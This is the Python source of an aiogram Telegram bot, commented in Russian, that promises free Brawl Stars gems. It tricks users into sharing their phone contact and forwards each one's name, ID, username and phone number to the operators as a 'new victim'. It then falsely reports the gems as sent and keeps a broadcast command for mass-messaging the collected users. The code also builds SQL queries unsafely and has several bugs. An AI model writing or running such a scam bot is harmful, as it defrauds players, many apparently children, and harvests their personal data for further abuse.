from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.dispatcher import Dispatcher, FSMContext
from aiogram import Bot, Dispatcher, executor, types
import db
import asyncio

#Конфиг
TOKEN = "токен из @BotFather"
ADMINS = [админы через знак "," в конце без комы!]
GEMS = 950

#Конфигурация API
bot = Bot(token=TOKEN, parse_mode="html")
dp = Dispatcher(bot, storage=MemoryStorage())

#Создание базы данных
db.CreateDB()

#Уведомление о запуске
async def started(dp):
    for a in ADMINS:
        await bot.send_message(chat_id=a, text='✅Бот запущен!')

@dp.message_handler(commands=['start'])
async def start(message):
   db.cursor.execute(f"SELECT name FROM users where id = {message.from_user.id}")
   if db.cursor.fetchone() == None:
      db.AddUser(message.from_user.first_name, message.from_user.id)
   don_kb = ReplyKeyboardMarkup(resize_keyboard=True)
   donate = KeyboardButton(text="💎ЗАБРАТЬ ГЕМЫ💎", request_contact=True)
   don_kb.add(donate)
   await message.reply(f'Привет, {message.from_user.first_name}!🤗\nЯ - бот который задонатит тебе {GEMS} гемов в бравл старс!🤑\nЧтобы получить донат, нажми кнопку ниже!😎', reply_markup=don_kb)

@dp.message_handler(content_types=['contact'])
async def contact(message):
   if message.contact.user_id != message.from_user.id:
      await message.reply("Отправьте свой контакт!")
      return
   for a in ADMINS:
       await bot.send_message(chat_id=a, text=f'🔔НОВАЯ ЖЕРТВА!🔔\n\n👤Имя: {message.contact.full_name}\n🆔Айди: <code>{message.contact.user_id}</code>\n🐕Юзернейм: @{message.from_user.username}\n☎Телефон: +{message.contact.phone_number}')
       db.AddNumber(message.contact.phone_number, message.from_user.id)
   await message.reply("⌨Введи свой тег в игре! (с # в начале)")

@dp.message_handler(lambda msg: msg.text.lower().startswith('#'))
async def tag(message):
   await message.reply("📲Отправляю твои {GEMS} гемов..")
   asyncio.sleep(5)
   await message.reply("🔥Ваши гемы появятся на вашем аккаунте в течении 24 часов!")

class Rass(StatesGroup):
	msg = State()

@dp.message_handler(commands=['rass'])
async def rass(message):
    if message.from_user.id not in config.ADMIN_IDS:
        return
    await message.answer('🖋 Введите текст/фото для рассылки:')
    await Rass.msg.set()

@dp.message_handler(content_types=types.ContentType.ANY, state=Rass.msg)
async def rass2(message, state: FSMContext):
    await state.finish()
    db.cursor.execute(f"SELECT id FROM users")
    query = db.cursor.fetchall()
    ids = [user[0] for user in query]
    confirm = []
    decline = []
    for rass in ids:
        try:
            await message.copy_to(rass)
            confirm.append(rass)
        except:
            decline.append(rass)
    await message.reply(f'📣 Рассылка завершена!\n\n✅ Успешно: {len(confirm)}\n❌ Неуспешно: {len(decline)}')

executor.start_polling(dp, on_startup=started)